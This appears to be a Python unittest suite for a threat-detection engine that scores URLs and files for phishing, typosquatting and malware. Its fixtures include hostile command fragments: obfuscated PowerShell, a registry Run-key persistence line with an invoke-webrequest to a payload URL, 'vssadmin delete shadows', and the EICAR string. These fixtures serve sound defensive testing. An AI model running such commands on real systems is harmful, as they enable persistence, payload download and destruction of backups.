import hashlib
import sys
from pathlib import Path
import unittest
from unittest.mock import patch


if __package__ in (None, ""):
    project_root = Path(__file__).resolve().parents[1]
    if str(project_root) not in sys.path:
        sys.path.insert(0, str(project_root))

from backend.app.services.intelligence_engine import (
    BehaviorAssessment,
    ContextAssessment,
    DigitalSignatureAssessment,
    ThreatAnalyzer,
    TrustAssessment,
)


class ThreatAnalyzerTrustAndBehaviorTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.analyzer = ThreatAnalyzer()

    def test_trusted_domain_matches_exact_domain_subdomain_and_trailing_dot(self) -> None:
        self.assertTrue(self.analyzer._is_trusted_domain("google.com"))
        self.assertTrue(self.analyzer._is_trusted_domain("login.microsoft.com"))
        self.assertTrue(self.analyzer._is_trusted_domain("WWW.OPENAI.COM."))
        self.assertFalse(self.analyzer._is_trusted_domain("microsoft.com.evil.tld"))

    def test_trusted_domain_reduction_subtracts_40(self) -> None:
        self.assertEqual(self.analyzer._apply_trusted_domain_reduction(50), 10)
        self.assertEqual(self.analyzer._apply_trusted_domain_reduction(11), 0)
        self.assertEqual(self.analyzer._apply_trusted_domain_reduction(0), 0)

    def test_url_analysis_exposes_trust_score_and_whitelist_context(self) -> None:
        analysis = self.analyzer.analyze_url("http://login.microsoft.com/verify?account=1")

        self.assertEqual(analysis["score"], 0)
        self.assertEqual(analysis["risk_level"], "safe")
        self.assertEqual(analysis["trust_score"], analysis["reputation_score"])
        self.assertGreaterEqual(analysis["trust_score"], 90)
        self.assertIn("Trusted whitelist domain", analysis["trust_signals"])
        self.assertIn("No HTTPS transport", analysis["trust_signals"])
        self.assertEqual(analysis["reasons"], [])
        self.assertEqual(analysis["behavioral_signals"], [])
        self.assertIn("Trusted domain matched", analysis["explanation"])

    def test_https_trusted_domain_is_safe(self) -> None:
        analysis = self.analyzer.analyze_url("https://openai.com/docs")

        self.assertEqual(analysis["risk_level"], "safe")
        self.assertEqual(analysis["reasons"], [])
        self.assertIn("HTTPS transport", analysis["trust_signals"])
        self.assertIn("Trusted domain uses HTTPS", analysis["explanation"])

    def test_typosquatting_domain_is_suspicious(self) -> None:
        analysis = self.analyzer.analyze_url("https://githib.com/login")

        self.assertEqual(analysis["risk_level"], "suspicious")
        self.assertIn("Typosquatting pattern detected", analysis["reasons"])
        self.assertIn("Typosquatting resemblance", analysis["context_signals"])
        self.assertIn("Typosquatting delivery pattern", analysis["behavioral_signals"])

    def test_extract_url_ml_features_include_trusted_flag(self) -> None:
        trusted_features = self.analyzer._extract_url_ml_features(
            "https://openai.com/login",
            "openai.com",
        )
        untrusted_features = self.analyzer._extract_url_ml_features(
            "http://evil-example.xyz/login",
            "evil-example.xyz",
        )

        self.assertEqual(len(trusted_features), 5)
        self.assertEqual(len(untrusted_features), 5)
        self.assertEqual(trusted_features[-1], 1)
        self.assertEqual(untrusted_features[-1], 0)
        self.assertEqual(self.analyzer.url_ml_model.n_features_in_, 5)

    def test_clean_reasonable_exe_is_low_risk_not_suspicious(self) -> None:
        analysis = self.analyzer.analyze_file("ToolSetup.exe", b"generic installer binary")

        self.assertEqual(analysis["score"], 0)
        self.assertEqual(analysis["risk_level"], "low_risk")
        self.assertEqual(analysis["reasons"], [])
        self.assertGreaterEqual(analysis["trust_score"], 70)
        self.assertIn("Clean installer-style filename", analysis["trust_signals"])
        self.assertIn("Installer-style filename semantics", analysis["context_signals"])
        self.assertIn(
            "Standalone executable without suspicious behavioral context",
            analysis["behavioral_signals"],
        )

    def test_known_source_exe_is_low_risk_with_high_reputation(self) -> None:
        analysis = self.analyzer.analyze_file("MicrosoftInstaller.exe", b"microsoft corporation setup")

        self.assertEqual(analysis["score"], 0)
        self.assertEqual(analysis["risk_level"], "safe")
        self.assertEqual(analysis["reasons"], [])
        self.assertGreaterEqual(analysis["trust_score"], 90)
        self.assertIn("Known software source markers", analysis["trust_signals"])

    def test_official_developer_tool_installers_are_not_flagged_by_binary_packaging(self) -> None:
        binary_like_content = (bytes(range(256)) * 32) + b"official release package"
        filenames = [
            "ChatGPTInstaller.exe",
            "AndroidStudio-2025.1.exe",
            "VSCodeUserSetup-x64.exe",
            "CursorUserSetup-x64.exe",
            "DockerDesktopInstaller.exe",
            "node-v22.12.0-x64.msi",
            "python-3.12.4-amd64.exe",
            "GitHubDesktopSetup-x64.exe",
            "JetBrainsToolbox-2.5.1.exe",
        ]

        for filename in filenames:
            with self.subTest(filename=filename):
                analysis = self.analyzer.analyze_file(filename, binary_like_content)

                self.assertIn(analysis["risk_level"], {"safe", "low_risk"})
                self.assertEqual(analysis["reasons"], [])
                self.assertGreaterEqual(analysis["trust_score"], 80)
                self.assertIn(
                    "Recognized software vendor or product name",
                    analysis["trust_signals"],
                )

    def test_known_safe_hash_reduces_risk_heavily_for_popular_installer(self) -> None:
        file_bytes = b"chatgpt installer fixture"
        safe_hash = hashlib.sha256(file_bytes).hexdigest()

        with patch.dict(
            "backend.app.services.intelligence_engine._KNOWN_SAFE_SOFTWARE_HASHES",
            {safe_hash: "ChatGPT Installer"},
            clear=False,
        ):
            analysis = self.analyzer.analyze_file(
                "ChatGPTInstaller.exe",
                file_bytes,
                sha256=safe_hash,
            )

        self.assertEqual(analysis["score"], 0)
        self.assertEqual(analysis["risk_level"], "safe")
        self.assertIn("Known safe software hash (ChatGPT Installer)", analysis["trust_signals"])
        self.assertIn("Recognized popular installer family (ChatGPT Installer)", analysis["trust_signals"])

    def test_valid_trusted_publisher_signature_increases_trust(self) -> None:
        with patch.object(
            self.analyzer,
            "_analyze_digital_signature",
            return_value=DigitalSignatureAssessment(
                is_signed=True,
                is_valid=True,
                publisher="Microsoft Corporation",
                issuer="Microsoft Code Signing PCA",
                status="Valid",
                signals=[
                    "Valid digital signature",
                    "Trusted publisher certificate (Microsoft Corporation)",
                ],
                is_trusted_publisher=True,
            ),
        ):
            analysis = self.analyzer.analyze_file(
                "VSCodeUserSetup-x64.exe",
                b"official release package",
                file_path="D:\\dummy\\VSCodeUserSetup-x64.exe",
            )

        self.assertEqual(analysis["risk_level"], "safe")
        self.assertEqual(analysis["signature_status"], "Valid")
        self.assertEqual(analysis["signature_publisher"], "Microsoft Corporation")
        self.assertTrue(analysis["signature_trusted_publisher"])
        self.assertIn("Valid digital signature", analysis["trust_signals"])
        self.assertEqual(
            analysis["explanation"],
            "Digitally signed by trusted publisher and matches legitimate software behavior.",
        )

    def test_unknown_randomized_exe_pattern_is_not_auto_escalated(self) -> None:
        analysis = self.analyzer.analyze_file("a9x2q7m5z8.exe", b"generic binary data")

        self.assertIn(analysis["risk_level"], {"safe", "low_risk"})
        self.assertEqual(analysis["reasons"], [])
        self.assertIn("Unknown executable provenance", analysis["behavioral_signals"])
        self.assertIn("Randomized filename semantics", analysis["context_signals"])
        self.assertLessEqual(analysis["trust_score"], 35)

    def test_double_extension_exe_behavior_is_suspicious(self) -> None:
        analysis = self.analyzer.analyze_file("invoice.pdf.exe", b"microsoft signed installer")

        self.assertEqual(analysis["risk_level"], "suspicious")
        self.assertIn("Double extension detected", analysis["reasons"])
        self.assertIn(
            "Executable masquerading through double extension",
            analysis["behavioral_signals"],
        )

    def test_payload_style_name_without_real_behavior_is_not_auto_flagged(self) -> None:
        analysis = self.analyzer.analyze_file("keygen.exe", b"microsoft utility")

        self.assertEqual(analysis["reasons"], [])
        self.assertIn(analysis["risk_level"], {"safe", "low_risk"})
        self.assertIn("Payload-oriented filename semantics", analysis["context_signals"])

    def test_multiple_strong_signals_escalate_to_malicious(self) -> None:
        analysis = self.analyzer.analyze_file("invoice.pdf.keygen.exe", b"generic trojan payload")

        self.assertEqual(analysis["risk_level"], "malicious")
        self.assertIn("Double extension detected", analysis["reasons"])
        self.assertIn("Trojan behavior detected", analysis["reasons"])

    def test_trusted_vendor_and_signature_usually_classify_clean_files_safe(self) -> None:
        analysis = self.analyzer.analyze_file(
            "VercelSetup.exe",
            b"digitally signed by vercel official installer https://vercel.com/download",
        )

        self.assertEqual(analysis["score"], 0)
        self.assertEqual(analysis["risk_level"], "safe")
        self.assertGreaterEqual(analysis["trust_score"], 95)
        self.assertIn("Digital signature markers", analysis["trust_signals"])
        self.assertIn("Trusted vendor markers", analysis["trust_signals"])
        self.assertIn("legitimate software or domain trust signals", analysis["explanation"])

    def test_obfuscated_powershell_is_flagged_as_real_suspicious_behavior(self) -> None:
        analysis = self.analyzer.analyze_file(
            "launcher.ps1",
            b"powershell -enc SQBFAFgA invoke-expression [System.Convert]::FromBase64String('QQ==')",
        )

        self.assertEqual(analysis["risk_level"], "suspicious")
        self.assertIn("Obfuscated PowerShell detected", analysis["reasons"])
        self.assertIn("Obfuscated PowerShell execution pattern", analysis["behavioral_signals"])
        self.assertEqual(
            analysis["explanation"],
            "Uses obfuscated commands and lacks trusted signature.",
        )

    def test_registry_persistence_and_network_activity_escalate(self) -> None:
        analysis = self.analyzer.analyze_file(
            "updater.js",
            b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater "
            b"invoke-webrequest http://198.51.100.10/payload",
        )

        self.assertEqual(analysis["risk_level"], "malicious")
        self.assertIn("Registry persistence detected", analysis["reasons"])
        self.assertIn("Suspicious network activity detected", analysis["reasons"])

    def test_ransomware_reasoning_mentions_multiple_engine_detections(self) -> None:
        analysis = self.analyzer.analyze_file(
            "locker.exe",
            b"your files have been encrypted bitcoin vssadmin delete shadows reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        )

        self.assertEqual(analysis["risk_level"], "malicious")
        self.assertIn("Ransomware behavior detected", analysis["reasons"])
        self.assertEqual(
            analysis["explanation"],
            "Detected ransomware-like behavior and multiple engine detections.",
        )

    def test_known_malware_hash_is_detected(self) -> None:
        analysis = self.analyzer.analyze_file(
            "eicar.com",
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
        )

        self.assertEqual(analysis["risk_level"], "malicious")
        self.assertIn("Known malware hash detected", analysis["reasons"])

    def test_human_like_logic_marks_trusted_clean_items_safe(self) -> None:
        risk_level = self.analyzer._classify_human_like_risk_level(
            score=0,
            reasons=[],
            trust_assessment=TrustAssessment(
                reputation_score=95,
                signals=["Known trusted domain"],
                is_trusted=True,
            ),
            context_assessment=ContextAssessment(signals=[]),
            behavior_assessment=BehaviorAssessment(signals=[]),
            ml_probability=0.18,
        )

        self.assertEqual(risk_level, "safe")

    def test_human_like_logic_marks_minor_issues_low_risk(self) -> None:
        risk_level = self.analyzer._classify_human_like_risk_level(
            score=28,
            reasons=[],
            trust_assessment=TrustAssessment(reputation_score=20, signals=[]),
            context_assessment=ContextAssessment(signals=[]),
            behavior_assessment=BehaviorAssessment(signals=[]),
            ml_probability=0.68,
        )

        self.assertEqual(risk_level, "low_risk")

    def test_human_like_logic_keeps_clean_high_reputation_binaries_non_suspicious(self) -> None:
        risk_level = self.analyzer._classify_human_like_risk_level(
            score=0,
            reasons=[],
            trust_assessment=TrustAssessment(
                reputation_score=92,
                signals=["Recognized software vendor or product name"],
                is_trusted=True,
            ),
            context_assessment=ContextAssessment(
                signals=["Recognized software product naming", "Common software distribution naming pattern"]
            ),
            behavior_assessment=BehaviorAssessment(signals=["Benign software packaging pattern"]),
            ml_probability=0.88,
        )

        self.assertEqual(risk_level, "safe")

    def test_human_like_logic_marks_multiple_signals_suspicious(self) -> None:
        risk_level = self.analyzer._classify_human_like_risk_level(
            score=48,
            reasons=["Registry persistence detected"],
            trust_assessment=TrustAssessment(reputation_score=10, signals=[]),
            context_assessment=ContextAssessment(signals=[]),
            behavior_assessment=BehaviorAssessment(signals=["Registry-based persistence pattern"]),
            ml_probability=0.58,
        )

        self.assertEqual(risk_level, "suspicious")

    def test_human_like_logic_marks_strong_signals_malicious(self) -> None:
        risk_level = self.analyzer._classify_human_like_risk_level(
            score=82,
            reasons=[
                "Double extension detected",
                "Known malware hash detected",
            ],
            trust_assessment=TrustAssessment(reputation_score=5, signals=[]),
            context_assessment=ContextAssessment(signals=["Randomized filename semantics"]),
            behavior_assessment=BehaviorAssessment(signals=["Executable masquerading through double extension"]),
            ml_probability=0.91,
        )

        self.assertEqual(risk_level, "malicious")

    def test_risk_level_boundaries_follow_current_thresholds(self) -> None:
        self.assertEqual(self.analyzer._classify_risk_level(20), "safe")
        self.assertEqual(self.analyzer._classify_risk_level(21), "low_risk")
        self.assertEqual(self.analyzer._classify_risk_level(50), "low_risk")
        self.assertEqual(self.analyzer._classify_risk_level(51), "suspicious")
        self.assertEqual(self.analyzer._classify_risk_level(75), "suspicious")
        self.assertEqual(self.analyzer._classify_risk_level(76), "malicious")


if __name__ == "__main__":
    unittest.main()
